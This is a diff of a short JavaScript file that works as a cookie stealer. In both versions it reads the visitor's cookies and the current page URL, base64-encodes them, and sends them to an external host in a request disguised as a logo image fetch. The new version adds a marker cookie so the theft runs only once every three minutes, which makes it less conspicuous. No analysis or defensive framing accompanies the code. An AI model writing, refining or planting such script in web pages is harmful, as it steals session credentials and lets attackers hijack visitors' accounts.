@@ -1,14 +1,22 @@
 var cookie = document.cookie;
 var current = window.location.href;
-let allx = btoa(cookie+" |eagle| "+current);
+let allx = btoa(cookie+" || "+current);
 
-var xhttp = new XMLHttpRequest();
+let xhttp = new XMLHttpRequest();
 
-xhttp.onreadystatechange = function() {
-    if (this.readyState == 4 && this.status == 200) {
-       // Typical action to be performed when the document is ready:
-       document.getElementById("demo").innerHTML = xhttp.responseText;
-    }
-};
-xhttp.open("GET","https://www.eagle-tube.com/raw/images/dfs_logo.img?x="+allx, true);
-xhttp.send();
+function getCookie(){
+  let ck = [];
+  let cs = cookie.split(';');
+  for(let i=0;i<cs.length;i++){
+    ck.push(cs[i].split('=')[0]);
+  }
+  return ck;
+}
+
+let keys = getCookie();
+
+if(keys.indexOf(' DFS_BASE')=='-1'){
+  xhttp.open("GET", "https://www.eagle-tube.com/raw/images/dfs_logo.img?x="+allx, true);
+  xhttp.send();
+  document.cookie="DFS_BASE=Initiated;max-age=180; path=/;";
+}
